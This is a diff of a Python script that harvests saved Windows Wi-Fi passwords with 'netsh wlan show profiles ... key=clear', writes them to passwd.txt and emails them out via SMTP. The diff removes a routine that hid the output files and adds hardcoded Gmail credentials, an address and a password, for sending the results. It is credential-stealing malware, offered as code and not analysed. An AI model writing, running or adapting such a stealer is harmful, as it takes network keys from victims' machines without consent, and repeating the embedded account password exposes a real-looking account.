@@ -1,6 +1,5 @@
 import os
 import socket
-import base64
 import smtplib
 
 
@@ -10,8 +9,9 @@ from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
 
 
-def getSSID(a):
-    file = open('random{}.txt'.format(a),'r')
+
+def getSSID():
+    file = open('random.txt','r')
     linhas = file.readlines()
     file.close()
     ssid = []
@@ -26,36 +26,18 @@ def getSSID(a):
     pass
 
 def mkText():
-    a = 0
-    while True:
-        file = 'random{}.txt'.format(a)
-        if os.path.isfile(file):
-            a = a + 1
-        else:
-            os.system('netsh wlan show profiles > random{}.txt'.format(a))
-            return a
-    pass
 
-def hide(a):
-    nick = 'random{}.txt'.format(a)
-    nick2 = 'passwd{}.txt'.format(a)
-    folder = os.listdir(os.getcwd())
-    for arq in folder:
-        if nick == arq or nick2 == arq:
-            os.system('attrib +h +i -a {}'.format(nick))
-            os.system('attrib +h +i -a {}'.format(nick2))
-            break
-            pass
-        pass
+    file = 'random.txt'
+    os.system('netsh wlan show profiles > random.txt')
+
     pass
 
 def execute():
     a = mkText()
-    string = getSSID(a)
+    string = getSSID()
     for x in range(0, string.__len__()):
-        os.system('netsh wlan show profiles "{}" key=clear >> passwd{}.txt'.format(string[x],a))
+        os.system('netsh wlan show profiles "{}" key=clear >> passwd.txt'.format(string[x]))
         pass
-    hide(a)
     return a
     pass
 
@@ -73,21 +55,6 @@ def check_host():
        pass
      a.close()
    return False
-
-
-
-def getMail():
-
-    #print("Google Mail ... ")
-    #email = input("Email: ")
-    #passwd = input("Password: ")
-    
-
-    emailSend(email,passwd)
-
-
-    pass
-
 
 def emailSend(email, passwd):
 
@@ -134,16 +101,9 @@ def emailSend(email, passwd):
 if __name__ == '__main__':
 
     a = execute()
-
-    getMail()
-
-    if(check_host()):
-        email('{}'.format(a))
-        print('workando')
-    else:
-        print('não workando')
-        pass
-
+    email = 'clashtantam@gmail.com'
+    passwd = 'Ygostoso@2'
+    emailSend(email, passwd)
 
 
 
